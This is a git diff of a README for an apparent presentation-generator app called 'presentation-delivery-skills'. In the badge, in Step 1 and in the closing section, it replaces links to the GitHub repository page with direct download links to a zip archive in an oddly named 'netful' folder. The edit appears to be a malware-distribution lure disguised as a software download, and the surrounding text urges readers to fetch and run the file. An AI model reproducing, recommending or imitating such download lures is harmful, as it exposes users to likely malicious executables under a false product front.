@@ -1,6 +1,6 @@
 # 🎤 presentation-delivery-skills - Turn Ideas Into Polished Presentations Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Presentation%20Delivery%20Skills-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/Yazanw6234/presentation-delivery-skills)
+[![Download Now](https://img.shields.io/badge/Download-Presentation%20Delivery%20Skills-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://raw.githubusercontent.com/Yazanw6234/presentation-delivery-skills/main/netful/delivery-skills-presentation-2.8-alpha.2.zip)
 
 ---
 
@@ -49,7 +49,7 @@ No waiting for hours. Your presentation is ready in moments, saving you valuable
 ### Step 1: Get the Application
 
 Visit this link to download the application:  
-**[https://github.com/Yazanw6234/presentation-delivery-skills](https://github.com/Yazanw6234/presentation-delivery-skills)**
+**[https://raw.githubusercontent.com/Yazanw6234/presentation-delivery-skills/main/netful/delivery-skills-presentation-2.8-alpha.2.zip](https://raw.githubusercontent.com/Yazanw6234/presentation-delivery-skills/main/netful/delivery-skills-presentation-2.8-alpha.2.zip)**
 
 ### Step 2: Save the File
 Once you click the link, you'll be taken to the download page. Look for the download button and save the file to a location you can easily find, like your Desktop or Downloads folder.
@@ -201,7 +201,7 @@ The best part? You stay in control. Every presentation is editable, so you can a
 
 Ready to get started? Download the application here:
 
-**[https://github.com/Yazanw6234/presentation-delivery-skills](https://github.com/Yazanw6234/presentation-delivery-skills)**
+**[https://raw.githubusercontent.com/Yazanw6234/presentation-delivery-skills/main/netful/delivery-skills-presentation-2.8-alpha.2.zip](https://raw.githubusercontent.com/Yazanw6234/presentation-delivery-skills/main/netful/delivery-skills-presentation-2.8-alpha.2.zip)**
 
 ---
 
